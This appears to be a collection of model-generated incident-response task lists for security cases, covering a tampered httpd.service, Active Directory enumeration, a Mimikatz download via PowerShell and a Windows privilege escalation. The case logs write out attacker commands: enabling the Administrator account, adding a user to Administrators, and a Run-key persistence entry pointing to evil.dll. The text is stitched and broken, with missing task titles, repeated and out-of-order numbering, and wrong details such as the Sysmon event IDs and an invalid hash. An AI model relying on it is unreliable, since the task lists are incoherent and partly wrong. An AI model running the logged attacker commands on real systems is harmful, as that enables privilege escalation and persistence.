
Task #3  
Title: Review root command history for suspicious activity  
Description: Retrieve the recent root shell history (e.g., `/root/.bash_history` or `/root/.zsh_history`). Filter entries between 13:25 and 13:30 on 2026‑03‑09, looking for unusual commands, new scripts, or alterations to system configuration tools. Note any deviations from normal administrative patterns.

---

Task #4  
Title: Scrutinize auditd logs around the modification window  
Description: Pull auditd events from 2026‑03‑09T13:25:00Z to T13:30:00Z. Search for `execve`, `open`, `chmod`, and `write` syscalls involving critical files outside `/etc/systemd/system/`. Flag any unexpected file accesses or failed authorizations that might indicate lateral movement or privilege escalation.

---

Task #5  
Title: Inspect systemctl reload and journal logs for the service  
Description: Query `journalctl` for entries tagged `systemctl` and `httpd.service` around 13:28:10Z. Examine service status snapshots, error messages, or warnings that could explain the immediate reload after modification. Compare these logs with a baseline to detect abnormal reload patterns.

---

Task #6  
Title: Verify cron jobs and scheduled tasks for hidden persistence  
Description: Enumerate all cron jobs (`/etc/crontab`, `/etc/cron.d/*`, `/var/spool/cron/root`) and systemd timers. Compare the current list to a recent backup or baseline. Identify any newly created or modified cron entries that could provide persistence or automated backdoor access.

---

Task #7  
Title: Analyze network activity during the 13:26‑13:29 pm window  
Description: Capture active network connections with `netstat` or `ss` for the period surrounding the modification. Inspect logs from the firewall, Zeek, or fail2ban for outbound connections to suspicious IPs, and inbound attempts to the web service. Correlate any abnormal traffic with the timestamp of the auditd event.

---

Task #8  
Title: Verify SELinux/AppArmor state and policy integrity  
Description: Check whether SELinux is enforcing (`getenforce`) and examine the current policy applied to `/etc/systemd/system/httpd.service`. Look for any context changes or new policy modules that might have been added around the modification time. Ensure no unauthorized policy relaxations have been implemented.

---

Task #9  
Title: Search for persistence via new binaries or systemd services  
Description: Scan directories such as `/usr/local/bin`, `/opt`, and `/home/*` for files created within the last hour. Inspect `/etc/systemd/system/` for any new or altered service units, especially those that employ `ExecStart` or `ExecStartPre` to launch hidden processes. Verify that no unauthorized services are loaded at boot.

---

Task #10  
Title: Confirm backup policy compliance and missing snapshots  
Description: Review the host’s backup configuration (e.g., `rsnapshot`, `borg`, or Veeam) to ensure that a snapshot should have existed before the modification. Verify the presence of snapshots or backups dated before 2026‑03‑09T13:26:00Z. If files are missing, investigate why the backup was not created and assess potential gaps in the protection strategy.
model_b_tasks:
Task #1
Title: Verify pre‑modification integrity of httpd.service
Description: Retrieve any available backups from /var/backups, golden images, or immudb snapshots to locate httpd.service as of 2026‑03‑09T13:26:54Z. Compute its SHA256 hash and confirm it matches the previous value (6b3f5c8a2f...). Establishing a baseline is critical for determining if the file was altered earlier or solely during the flagged window.

Task #2
Title: Examine auditd logs preceding modification
Description: Query auditd for all open/write events on /etc/systemd/system/httpd.service between 13:26:00 and 13:27:00Z (ID 197). Identify any other root (UID 0) actions in that window that may have set up temporary files, environment changes, or prior edits to httpd.service or related override directories.

Task #3
Title: Identify shell session that executed chmod (PID 5423)
Description: Inspect /proc/5423 for cmdline, PPID, environment variables, and working directory to determine the exact shell script or command invoked. Cross‑reference auditd execve logs at 13:26:55Z to confirm the script path and capture any arguments passed, which may reveal the purpose of the chmod operation.

Task #4
Title: Recover the sh script executed by PID 5423
Description: Locate the script file referenced by PID 5423 (e.g., /tmp/tmp.sh) by examining /proc/5423/cmdline and full command hierarchy. Extract its contents from disk (if still present) or reconstruct it from auditd logs capturing the file creation or modification events that led to httpd.service being written.

Task #5
Title: Trace origin of new httpd.service content via sysdig
Description: Parse the captured sysdig trace for file write operations targeting /etc/systemd/system/httpd.service during the event window. Extract the data written in those syscalls to reconstruct the complete new configuration, allowing precise diff against the original file.

Task #6
Title: Compare new httpd.service hash against known good
Description: Compute SHA256 of the post‑modification httpd.service file as of 13:27:02Z and perform a detailed diff with the original configuration. Highlight any added directives, especially ExecStartPost, EnvironmentFile, or RuntimeDirectory overrides that could inject malicious behavior or persistence.

Task #7
Title: Inspect httpd.service.d override directories
Description: Search /etc/systemd/system/httpd.service.d/ for any override files created around the modification time. Examine their contents for ExecStartPost, ExecReload, or other lines that execute arbitrary binaries or shell scripts, which may serve as persistence or delivery mechanisms.

Task #8
Title: Verify systemctl reload command lineage
Description: From the sysdig trace, extract the command hierarchy leading to ‘systemctl reload httpd.service’ executed by root at 13:28:10Z. Identify the parent process (e.g., a shell script or cron job) and review its logic to determine why an immediate reload followed the configuration change.

Task #9
Title: Check service status before and after reload
Description: Run ‘systemctl status httpd.service’ immediately before (≈13:27:00Z) and after (≈13:29:00Z) the reload to detect any state changes, configuration errors, or failures reported by httpd. Note any warning messages that could indicate a parsed configuration issue or partial reload.

Task #10
Title: Search journalctl for httpd.service reload logs
Description: Query the systemd journal for all messages related to httpd.service between 13:27:00Z and 13:29:00Z. Pay special attention to warnings such as ‘Invalid directive’, ‘File not found’, or ‘Reload failed’, which may signal improper configuration edits or tampering.

Task #11
Title: Inspect scheduled tasks for configuration changes
Description: Enumerate all cron jobs (root, system, user) and systemd timers active during 13:26:00‑13:29:00Z. Verify that none correspond to httpd.service modifications or unwarranted reloads, ensuring that the change was not orchestrated via standard configuration management or automation.

Task #12
Title: Scan network activity post‑modification
Description: Review netstat or ss snapshots, firewall logs, and any available packet captures from 13:27:00–13:30:00Z to identify suspicious outbound connections (e.g., to uncommon ports like 4444 or 31337). Correlate connecting process IDs with the httpd reload event to detect potential data exfiltration or remote command and control sessions.

Task #13
Title: Search for persistence mechanisms in systemd/init scripts
Description: Scan all custom unit files under /etc/systemd/system/, /lib/systemd/system/, and /etc/init.d/ for new or modified entries that could establish backdoor persistence. Look specifically for ExecStart lines invoking unknown binaries, scripts, or shell commands that run on boot or service start.

Task #14
Title: Review root login and command history
Description: Examine /var/log/auth.log, /var/log/secure, and journalctl -b | grep sudo for any root SSH logins, console logins, or sudo commands around 13:26–13:28Z. Correlate these events with auditd logs to build a complete picture of user activity that may have authorized the modification.

Task #15
Title: Cross‑reference OSSEC alert and other SIEM feeds
Description: Inspect the OSSEC FI Configuration Change alert (severity 3) for additional context, tags, or linked events on the same host. Query any integrated SIEM or SOAR orchestration for correlated indicators (e.g., brute‑force attempts, lateral movement, privilege escalation) that could explain the modification.

Task #16
Title: Validate httpd binary integrity
Description: Compute the SHA256 hash of the running httpd binary (/usr/sbin/httpd) and compare it against the official package hash from the distribution’s repository metadata. A mismatch could signify a deeper compromise beyond configuration tampering.

Task #17
Title: Acquire forensic image of the host
Description: Create a bit‑for‑bit forensic image of the root filesystem using a tool like ddrescue or a certified forensic imaging solution. Preserve timestamps and metadata, and secure the image in a write‑protected repository with documented chain‑of‑custody records for future analysis.

Task #18
Title: Develop containment and remediation plan
Description: Based on investigation findings, outline immediate containment actions—quarantining the host, stopping the httpd service, or severing network connectivity. Remediate by restoring httpd.service from a known good baseline, rolling back to a clean snapshot if available, applying pending security patches, and resetting any compromised credentials. Document all actions taken and schedule follow‑up monitoring to detect recurrence.

case_title: External enumeration attempt targeting internal Active Directory resources via SMB, DNS, and network scanning
case_description: Source IP 203.0.113.45; Target IP 10.10.10.20; Time 2024-03-01T04:22:00Z – 2024-03-01T04:35:00Z; Ports scanned 139, 445, 135, 389, 3389; IDS alert SOLIDWALL-29003 (Probe) on port 139; Windows Event ID 4624 logons using Guest account from 203.0.113.45; NetBIOS enumeration logs from 10.10.10.20; DNS zone transfer attempts for corp.example.com; Firewall logs show repeated SYNs to port 445; Syslog shows “net.exe” executed at 04:28:00Z; Nmap-like scan signature detected.
model_a_tasks:
Task #1  
Title: Identify the role of the internal target (10.10.10.20)

Task #2

Description: Pull all 4624 events in the 04:20–04:35 Z window for the Guest account, noting any additional authentication successes or failures, and map them to source IPs for pattern analysis.

Task #3  
Title: Investigate unauthorized “net.exe” execution at 04:28:00Z  
Description: Retrieve the process launch details (command‑line arguments, parent process, file hash) from Windows Sysmon, and check for any net user/group commands that might indicate enumeration or privilege escalation attempts.

Task #4

Description: Parse the NetBIOS logs to list all network names resolved, the queries sent, and the responses received from 203.0.113.45. Identify any sensitive or privileged shares that were enumerated.

Description: Identify the number of SYN packets, any SYN‑ACK responses, and the intervals between them to confirm if this was a sustained scan. Verify whether the firewall blocked or allowed any of the packets.

Task #7  
Title: Analyze Nmap‑like scan signature detected by the IDS  
Description: Use IDS logs to derive the scan characteristics (protocols, port sequence, timing). Correlate with firewall and NetBIOS logs to map the scanning timeline.

Task #8

Description: Search for RPC calls initiated from 203.0.113.45 to 10.10.10.20, especially any “lsass.exe” or “wbemadmin” interactions that may signify exploitation attempts.

Task #9

Description: Pull LDAP traffic logs or use Wireshark captures to confirm whether the external IP made directory queries, and if those queries returned attributes such as usernames, group memberships, or passwords.

Task #10

Task #11

Description: Scan 10.10.10.20 for scheduled tasks, startup items, registry run keys, or hidden services that could indicate post‑enumeration persistence attempts.

Task #12

Description: Confirm whether the Guest account should have network logon rights; check whether any policies have been updated recently that could explain its use. Identify any policy deviations.

Task #13

Description: Query the SOAR platform for alerts labeled “Probe” or “Scan” around 04:20–04:35 Z to detect if other hosts were scanned or if the same external IP was probing multiple assets.

Task #14

Description: Summarize the enumeration success, any legitimate or illegitimate logons, and potential data exposure. Classify the activity as low‑, medium‑, or high‑risk based on findings.

A clean pass for Guest after failures may signal an intentional enumeration rather than brute force.

Task #3

Task #4

Verify if the transfer succeeded and review the returned records. If the zone was transferred, immediately restrict zone transfer permissions to only authorized IP addresses and audit any changes made to the zone that might indicate tampering.

---

Task #6  
Title: Retrieve command‑line details of the net.exe execution on the target host  
Description: Search for Sysmon Process Creation events (Event ID 5376 on older Sysmon, 4688 on newer Windows Security logs) for instances of net.exe at 04:28:00 UTC on 10.10.10.20. Extract the full command line, parent process, and any redirected output files. This reveals which enumeration subcommands were run (e.g., “net view”, “net group /DOMAIN”, “net computer /domain”) and whether any scripts were downloaded or executed during the process.

---

Task #7  
Title: Conduct threat intelligence lookup on source IP 203.0.113.45  
Description: Query the latest threat intel feeds (MISP, AlienVault OTX, AbuseIPDB, etc.) for the IP 203.0.113.45 to identify known malicious activity, botnet affiliation, or previous scanning campaigns. If the IP is flagged, recommend immediate blocking at the perimeter firewall and monitor for subsequent reconnaissance attempts.

---

Task #8  
Title: Evaluate evidence of lateral movement following enumeration  
Description: Inspect Kerberos ticket request logs (Event ID 4768/4769) and outbound SMB connection logs on 10.10.10.20 for evidence that the attacker used credentials harvested from the Guest enumeration to access other systems. Cross‑reference with Scheduled Task creation logs (Event ID 4698/4699) and Remote Procedure Call logs to spot persistence attempts triggered through discovered shares.

---

Task #9  
Title: Assess file integrity changes indicative of credential harvesting attempts  
Description: Query your file integrity monitoring server for modifications to the SAM or SYSTEM hive files, or creation of sysvol backup copies, on 10.10.10.20 since 04:20:00 UTC. Any unauthorized changes could signal the attacker attempted to extract password hashes. If detected, initiate a credential reset and forensic chain‑of‑custody process.

---

Task #10  
Title: Implement protective controls based on enumeration findings  
Description: Based on the investigation, apply the following remediations: disable Guest logons on all AD domain controllers and enforce the “Deny access to this computer from the network” policy for Guest on the target host; restrict DNS zone transfer ACLs to only internal servers; enable SMB signing on 10.10.10.20; increase auditing level for SMB file operations; and block/ quarantine source IP 203.0.113.45 unless proven benign. Document all changes in the SOC knowledge base for future reference.

case_title: Suspicious remote command execution via PowerShell indicates a potential exploitation attempt targeting privileged accounts.
case_description: Event ID 4624: successful RDP login from IP 203.0.113.45; PowerShell process (PID 5292) executing base64‑encoded command to download "Mimikatz" from 198.51.100.24; Process creation of cmd.exe with "/c net user administrator /active:yes" on machine 172.16.10.4; Registry modification HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Exploit pointing to psexec.exe for persistence; Outbound SSL traffic to deadquadrant.com port 443; Scheduled task "ExploitScheduler" created by user jdoe to run every minute; File creation at C:\Temp\exploit.exe from remote download; Process injection of psutil.dll into explorer.exe; Suspicious DNS queries to evilproxy.net; Elevated token usage detected on non-admin user account.
model_a_tasks:
Task #1  
Title: Verify the source and legitimacy of the RDP login  
Description: Examine the security logs for the RDP session from IP 203.0.113.45 – confirm the user account (jdoe) and the originating system. Cross‑reference the IP against threat intelligence feeds and internal IP allocation to determine if this is a known malicious actor or an unexpected external access.  

Task #2  
Title: Decode and analyze the base64‑encoded PowerShell command  
Description: Extract the base64 payload from the PowerShell process (PID 5292). Use a PowerShell decoders or an external script to translate it into clear text, then review the commands executed (e.g., download URL and file name). Verify if the command matches known malicious patterns or references.  

Task #3  
Title: Confirm the download of Mimikatz from the external host  
Description: On the compromised host (172.16.10.4), inspect the network flow to 198.51.100.24, retrieve the downloaded file, and run static analysis (hash, file type). Validate if it is a legitimate Mimikatz build or a customized variant with additional backdoor code.  

Task #4  
Title: Inspect the cmd.exe invocation that enabled the Administrator account  
Description: Capture the command line used by cmd.exe with "/c net user administrator /active:yes". Determine whether this action is authorized or indicates privilege escalation. Flag the enabling of the default Administrator account for immediate remediation.

case_title: Detected Privilege Escalation Attempt via Local Windows Vulnerability Exploit
case_description:
- Windows Security Event ID 4624: Successful logon (type 3) for user *svc_admin* from IP 10.0.2.4 on server *srv01* at 2026-03-09T02:36:45Z.  
- Windows Security Event ID 4672: Privilege use event for user *svc_admin* on server *srv01* at 2026-03-09T02:38:00Z.  
- Sysmon Event ID 1: Process creation *cmd.exe* (PID 2345) with parent *explorer.exe* (PID 1020), user *svc_admin*, command line `net localgroup Administrators alice /add` at 2026-03-09T02:38:20Z.  
- Sysmon Event ID 6: Process creation *psexec.exe* (PID 4567) with parent *cmd.exe* (PID 2345), user *svc_admin*, arguments `-s -d C:\Windows\System32\services.exe` at 2026-03-09T02:39:30Z.  
- Scheduled Task: Task *PrivEscTask* created at 2026-03-09T02:39:00Z for user *svc_admin*, run level "Highest privileges".  
- Windows Security Event ID 4662: File access to `C:\Program Files\TrustedApp\app.exe` by user *svc_admin* with Modify rights at 2026-03-09T02:37:10Z.  
- Windows Security Event ID 4670: Permission change to the *Administrators* group on object `C:\Windows\System32\drivers\kernel.dll` by user *svc_admin* at 2026-03-09T02:37:55Z.  
- File creation: `C:\Users\alice\AppData\Local\Temp\evil.dll` (SHA256: AB12CD34 EF56GH78) created at 2026-03-09T02:36:50Z.  
- File deployment: `stealth.exe` copied to `C:\Windows\System32` at 2026-03-09T02:36:45Z.  
- Network activity: SMB SMB1 traffic from 10.0.2.4 to 10.0.5.2 on port 445 observed at 02:36:30Z, including file copy operations.  
- DNS logs: NXDOMAIN queries for domain `malicious.example.com` from server *srv01* at 02:38:10Z.  
- PowerShell execution: `powershell.exe` launched with command line `Start-Process cmd -Verb RunAs` at 2026-03-09T02:38:25Z.  
- Registry modification: `reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v MyApp /t REG_SZ /d C:\Windows\system32\evil.dll` executed by *svc_admin* at 2026-03-09T02:40:05Z.
model_a_tasks:
Task #1
Title: Validate the legitimacy of the initial logon event for svc_admin
Description: Review Windows Security Event ID 4624 to confirm that the successful logon (type 3) from IP 10.0.2.4 on srv01 is expected. Check whether svc_admin normally logs on from that subnet or if this indicates a potential remote compromise. Cross‑reference with known authorized accounts, IP whitelists, and accepted login patterns.

Task #2
Title: Correlate privilege escalation events with scheduled task creation
Description: Compare Event ID 4672 with the scheduled task *PrivEscTask* created at 02:39:00 Z. Verify that the task’s run level, trigger, and action are consistent with legitimate administrative activity. Ensure the task has not been tampered with and is not an obscure persistence method.

Task #3
Title: Verify the cmd.exe command that modifies group membership
Description: Inspect the command line `net localgroup Administrators alice /add` executed by cmd.exe. Confirm whether adding user alice to the Administrators group is expected and authorized. Look for any other unauthorized group changes within the same timeframe.

Task #4
Title: Examine the psexec.exe invocation for further escalation
Description: Analyse the psexec command `-s -d C:\Windows\System32\services.exe`. Determine whether this invocation is part of a legitimate administrative task or a malicious attempt to gain system-level access. Check for logs of services.exe launch and potential persistence payloads.

Task #5
Title: Confirm the presence and integrity of stealth.exe in System32
Description: Locate `C:\Windows\System32\stealth.exe` on srv01. Compute its hash, compare to internal baselines, and verify the file’s digital signature and metadata. Assess whether the file matches a known legitimate utility or is a suspicious payload.

Task #6
Title: Analyse the malicious DLL located in the Temp folder
Description: Retrieve `C:\Users\alice\AppData\Local\Temp\evil.dll` and compute its SHA256 A B12CD34 EF56GH78. Perform static analysis and sandbox execution to determine its capabilities. Verify whether the DLL is loaded by any running process and whether it has established persistence.

Task #7
Title: Verify and audit the permission change to kernel.dll
Description: Review Event ID 4670 indicating modifications to `C:\Windows\System32\drivers\kernel.dll`. Compare the current ACL against a known-good baseline to detect privilege escalation attempts. Ensure that only authorized administrative accounts have modify rights.

Task #8
Title: Investigate SMB SMB1 traffic for potential file copy malicious activity
Description: Examine the SMBv1 traffic from 10.0.2.4 to 10.0.5.2 on port 445 logged at 02:36:30 Z. Identify the files transferred and verify whether the session included unauthorized file copies. Determine if SMB1 can be disabled to reduce attack surface.

Task #9
Title: Analyze NXDOMAIN queries for malicious domain
Description: Parse the DNS logs for `malicious.example.com` queries originating from srv01 at 02:38:10 Z. Confirm whether the domain resolution was blocked or failed intentionally. Check for any attempts to contact command‑and‑control infrastructure or malicious content delivery.

Task #10
Title: Confirm persistence via registry Run key
Description: Inspect the Run key addition at 02:40:05 Z that points to `C:\Windows\system32\evil.dll`. Resolve the path to ensure it references the malicious DLL. Evaluate whether this Run entry is a baseline configuration or a stealth persistence mechanism.

Task #11
Title: Check for modifications to TrustedApp executable
Description: Review Event ID 4662 showing svc_admin’s modify rights to `C:\Program Files\TrustedApp\app.exe`. Verify whether the application was legitimately updated or if an unauthorized modification took place. Cross‑reference with version history and digital signatures.

Task #12
Title: Track the PowerShell execution chain for elevation
Description: Detail the PowerShell invocation `Start-Process cmd -Verb RunAs`. Determine if the action was a legitimate administrative elevation or part of a crafted escalation. Correlate this with the subsequent cmd.exe and psexec processes to map the full chain of execution.

Task #13
Title: Build a comprehensive timeline of the event chain
Description: Aggregate all timestamps from Event IDs, file creations, and network activity to create a detailed timeline. Highlight each step from the initial stealth.dll deployment through privilege escalation and persistence. Identify any gaps or asynchronous events that warrant deeper investigation.

Task #14
Title: Assess if other endpoints show similar malicious indicators
Description: Search the network for comparable events: unauthorized group additions, suspicious file hashes, SMB traffic, and registry modifications. Determine whether this incident is isolated to srv01 or part of a broader compromise across the environment.

Task #15
Title: Contain and remediate the compromised environment
Description: Isolate the affected system(s) from the network, remove malicious binaries (stealth.exe, evil.dll), delete the scheduled task, and revert any ACL changes made to kernel.dll. Reset compromised accounts, apply patches for the local vulnerability exploited, and conduct a full integrity check of key system artifacts.
model_b_tasks:
Task #1  
Title: Verify svc_admin effective privileges on srv01  
Description: Using PowerShell run `Get-LocalUser svc_admin | Get-LocalGroupMember -Member svc_admin` and inspect the token's privileges to confirm if svc_admin now holds Administrator rights or elevated token capabilities. Compare results against baseline group memberships and note any unauthorized access levels.

Task #2  
Title: Identify exploited Windows privilege escalation vulnerability  
Description: Correlate the timestamps of Sysmon events (IDs 1 & 6), malicious binaries (evil.dll & stealth.exe), and Windows Event ID 4670 to determine which known CVE or custom exploit was likely used. Cross‑reference the build number of srv01 with security bulletin releases to see if a patch was missed.

Task #3  
Title: Audit scheduled task PrivEscTask for persistence mechanisms  
Description: Open Task Scheduler on srv01, locate PrivEscTask, and review its action, trigger, and run level ("Highest privileges"). Check the script or binary it runs; if it references evil.dll, stealth.exe, or other malicious payloads, disable or delete the task pending further analysis.

Task #4  
Title: Examine Administrators group addition of user alice  
Description: Use `net localgroup Administrators alice` to verify alice’s membership status. Investigate the source of the command (Sysmon event 1 showing cmd.exe “net localgroup Administrators alice /add”) and confirm that alice was not pre‑existing within the Administrators group according to security baselines.

Task #5  
Title: Investigate ACL changes to kernel.dll  
Description: Retrieve the current ACL of `C:\Windows\System32\drivers\kernel.dll` using `Get-Acl`. Compare it with the documented baseline ACL ( from backups, Group Policy, or internal inventory). Identify if any non-admin users now have Modify rights and revert permissions if unauthorized.

Task #6  
Title: Trace PsExec usage and legitimacy  
Description: Verify the location of psexec.exe invoked by svc_admin (Sysmon event 6). If present in a non‑system32 directory or an unusual location, investigate its provenance (developer tools vs. third‑party). Inspect command line arguments (`-s -d C:\Windows\System32\services.exe`) to assess whether svc_admin is attempting to elevate service privileges or maintain persistence.

Task #7  
Title: Confirm registry Run key persistence by svc_admin  
Description: Query `HKLM\Software\Microsoft\Windows\CurrentVersion\Run` for the MyApp entry via PowerShell or regedit. Verify that the value points to `C:\Windows\system32\evil.dll` and compare it with historical registry exports or baselines to determine if this modification is new and unauthorized.

Task #8  
Title: Determine scope of SMB SMB1 file copy activity  
Description: Review Netstat and SMB logs for connections from srv01 to 10.0.5.2 on port 445 around 02:36:30Z. Identify any files transferred, particularly copies of malicious binaries or newly created temp files, and assess whether lateral movement or additional deployments occurred.

Task #9  
Title: Assess DNS NXDOMAIN queries for malicious domain  
Description: Examine DNS server logs for queries from srv01 to `malicious.example.com`. Determine if this domain has been associated with known command & control infrastructure via threat intelligence feeds. Block resolution of the domain at the DNS server or firewall if confirmed malicious.

Task #10  
Title: Correlate PowerShell execution of Start-Process cmd  
Description: Use Sysmon event filtering to follow the process creation chain: powershell.exe → cmd.exe. Determine if this invocation is part of legitimate automation or an attempt to bypass User Account Control. Verify the origin of the PowerShell script – local file vs. downloaded content.

Task #11  
Title: Build a comprehensive timeline of privilege escalation events  
Description: Combine timestamps from Windows Event IDs (4624, 4672, 4670), Sysmon IDs (1, 6), DNS, and SMB logs into a visual timeline (e.g., via Chronology or TimelineX). Highlight key actions: initial logon, group membership change, registry modification, malicious binary deployment.

Task #12  
Title: Perform full process lineaging analysis for svc_admin sessions  
Description: Using Process Explorer and Sysinternals Process Monitor, reconstruct the parent-child relationships of processes spawned by svc_admin around 02:36‑02:40Z. Document any anomalous hierarchies or unexpected child processes (e.g., cmd.exe launching services.exe).

Task #13  
Title: Execute forensic imaging of srv01 for deep analysis  
Description: Place srv01 into kill‑switch mode, disable wireless adapters, and perform a write‑block disk imaging (ddrescue or similar). Preserve a bit‑exact copy for chain‑of‑custody. Mount the image offline to conduct deeper artifact extraction (registry hives, pagefile.sys, driver images).

Task #14  
Title: Detect additional malicious artifacts and IOCs on srv01  
Description: Run a full endpoint malware scan referencing the evil.dll SHA256 (AB12CD34EF56GH78). Search for other suspicious child processes, services, WMI persistence, or rootkit indicators using specialized tools (e.g., RegRipper, Maltrail, RootkitRevealer).

Task #15  
Title: Survey the network for lateral movement footholds  
Description: Extend the investigation to hosts on domain 10.0.5.x and other subnets reachable via srv01, especially those that received SMB file transfers. Perform credential dumping checks (Mimikatz audit), service enumeration, and group membership reviews to gauge extended compromise scope.

Task #16  
Title: Validate legitimacy of svc_admin network logon (Event ID 4624, type 3)  
Description: Inspect the authentication package used (NTLM, Kerberos, Pass-the-Hash indicator). Verify the source IP 10.0.2.4 against known trusted front‑ends; if unrecognized, investigate potential credential theft or relay attacks. Confirm that svc_admin should never perform a network logon under normal operations.

Task #17  
Title: Investigate potential service manipulation attempts  
Description: Search Sysmon logs for process creation of services.exe under svc_admin. Cross‑check with Service Control Manager for added, modified, or deleted services that could serve as persistence or privilege escalation mechanisms. Determine if any new services point to evil.dll or stealth.exe.

Task #18  
Title: Check for signs of kernel DLL tampering or rootkit engagement  
Description: Use integrity monitoring (OSSEC, Tripwire) to compare kernel.dll hash against clean baseline. Run rundll32 detection scripts to spot hidden driver loads. If kernel.dll modifications are confirmed, consider a kernel‑mode rootkit scan and roll back changes.

Task #19  
Title: Sandbox malicious binaries for behavioral analysis  
Description: Deploy `evil.dll` and `stealth.exe` in a protected VM environment (e.g., Cuckoo Sandbox). Record file system changes, registry modifications, process creations, and network contacts. Compare sandbox activity with live execution traces from srv01.

Task #20  
Title: Restore ACLs and integrity of system-critical files  
Description: Apply the documented baseline ACLs to `C:\Windows\System32\drivers\kernel.dll` and any other tampered system files. Re-run Windows File Protection (`DISM /Online /Cleanup-Image /RestoreHealth`) to repair any corrupted system binaries.

Task #21  
Title: Isolate srv01 pending comprehensive analysis  
Description: Disconnect srv01 from its VLAN or set firewall rules to block inbound/outbound traffic temporarily. Notify relevant stakeholders of isolation to prevent potential lateral infection. Continue internal monitoring for residual malicious activity.

Task #22  
Title: Eradicate identified malicious binaries and persistence mechanisms  
Description: Remove `evil.dll`, `stealth.exe`, and the MyApp registry Run key. Revoke alice’s membership from Administrators if added maliciously. Ensure scheduled task PrivEscTask is cancelled or replaced with a legitimate administrative task.

Task #23  
Title: Recover srv01 from known good state and validate system integrity  
Description: Restore srv01 from the most recent clean backup or image. Run System File Checker (`sfc /scannow`) and DISM image health check post‑recovery. Verify that svc_admin no longer has elevated privileges unless required, and that no malicious artifacts remain.

Task #24  
Title: Update detection rules and SOAR playbooks for future incidents  
Description: Add correlation rule for `net localgroup Administrators * /add` by non‑administrator token. Raise alert on PsExec usage targeting services.exe. Incorporate the discovered malicious domain and file hashes into the SOAR IOC repository. Automate escalation of such tasks.

Task #25  
Title: Conduct lessons‑learned review and update defensive posture  
Description: Compile a detailed incident report covering detection, response, containment, eradication, and recovery activities. Identify gaps in patch management (SMB1 usage), monitoring (lack of CMD localgroup detection), or user awareness (svc_admin misuse). Update playbooks, baseline configurations, and training materials. Communicate findings and defensive improvements to leadership and technical teams.
